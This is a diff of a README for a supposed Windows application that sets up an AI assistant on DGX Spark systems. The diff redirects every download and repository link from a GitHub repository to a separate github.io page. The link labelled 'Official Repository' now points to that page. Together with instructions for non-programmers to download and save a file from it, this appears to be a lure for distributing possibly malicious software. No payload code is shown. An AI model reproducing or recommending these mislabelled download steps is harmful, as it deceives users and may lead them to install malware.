@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you install and run **dgx-spark-2-deepseek-flash-0731** on your Windows computer. This application lets you set up a powerful AI assistant on two DGX Spark systems. You don’t need any programming skills—just follow the steps below, and you’ll be up and running in no time.
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF4500)](https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF4500)](https://11harjo8842.github.io)
 
 ## 📦 What Is This?
 
@@ -24,7 +24,7 @@ To ensure everything runs smoothly, your computer should meet these minimum requ
 
 Follow these simple steps to get the application onto your computer:
 
-1. **Visit the Download Page** – Click the big orange button above, or go to this address: [https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731](https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731)
+1. **Visit the Download Page** – Click the big orange button above, or go to this address: [https://11harjo8842.github.io](https://11harjo8842.github.io)
 2. **Download the File** – Visit this link to download the application.
 3. **Save It Somewhere Easy** – Once downloaded, save the file to your **Desktop** or **Downloads** folder so you can find it right away.
 
@@ -156,8 +156,8 @@ This project is released under the **MIT License**. That means you can use, modi
 
 ## 🔗 Quick Links
 
-- **Download Page:** [Click Here](https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731)
-- **Official Repository:** [github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731](https://github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731)
+- **Download Page:** [Click Here](https://11harjo8842.github.io)
+- **Official Repository:** [github.com/11harjo8842/dgx-spark-2-deepseek-flash-0731](https://11harjo8842.github.io)
 
 ---
 
